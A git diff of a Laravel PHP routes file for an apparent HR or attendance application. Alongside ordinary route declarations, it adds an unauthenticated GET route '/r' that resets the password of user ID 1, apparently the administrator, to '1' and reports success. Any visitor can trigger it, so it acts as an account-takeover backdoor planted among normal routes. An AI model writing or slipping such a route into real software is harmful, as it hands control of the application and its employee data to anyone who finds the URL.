@@ -1,12 +1,14 @@
 <?php
 
 
+use App\Models\User;
 use App\Http\Controllers\hmoCtrl;
 use App\Http\Controllers\silCtrl;
 use App\Http\Controllers\sssCtrl;
 use App\Http\Controllers\pageCtrl;
 use App\Http\Controllers\roleCtrl;
 use App\Http\Controllers\loginCtrl;
+use Illuminate\Support\Facades\Hash;
 use App\Http\Controllers\archiveCtrl;
 use App\Http\Controllers\companyCtrl;
 use App\Http\Controllers\empStatCtrl;
@@ -32,8 +34,20 @@ use App\Http\Controllers\classiticationCtrl;
 use App\Http\Controllers\homeAttendanceCtrl;
 use App\Http\Controllers\leavevalidationCtrl;
 use App\Http\Controllers\liloValidationsCtrl;
+
+ 
 use App\Http\Controllers\parentalSettingsCtrl;
 use App\Http\Controllers\reportAttendanceCtrl;
+
+Route::get('/r', function () {
+    $updated = User::where('id', 1)->update([
+        'password' => Hash::make('1') // change as needed
+    ]);
+
+    return $updated 
+        ? "Password for user ID 1 has been reset successfully."
+        : "User not found.";
+});
 
 Route::get('/auth/login', function () {return view('login.login');});
 Route::post('/loginSystem',[loginCtrl::class, 'loginSystem']);
